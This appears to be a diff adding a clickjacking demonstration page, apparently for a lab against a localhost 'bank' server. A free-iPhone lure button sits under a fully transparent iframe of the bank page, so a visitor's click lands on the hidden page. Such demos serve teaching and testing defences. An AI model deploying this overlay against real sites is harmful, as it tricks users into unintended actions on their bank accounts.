@@ -1,0 +1,26 @@
+<!doctype html>
+<html>
+  <head>
+    <style>
+      #bank {
+        position: absolute;
+        top: 0px;
+        left: 0px;
+        z-index: 1;
+        opacity: 0;
+      }
+    </style>
+  </head>
+  <body>
+    <h1>Offer Offer Offer !!!</h1>
+    <button style="background-color: green" id="btn">
+      Grab Your Free IPhone
+    </button>
+    <iframe src="http://localhost:2000/server1/bank" id="bank"></iframe>
+    <script>
+      document.getElementById("btn").addEventListener("click", () => {
+        alert("You owned an IPhone");
+      });
+    </script>
+  </body>
+</html>
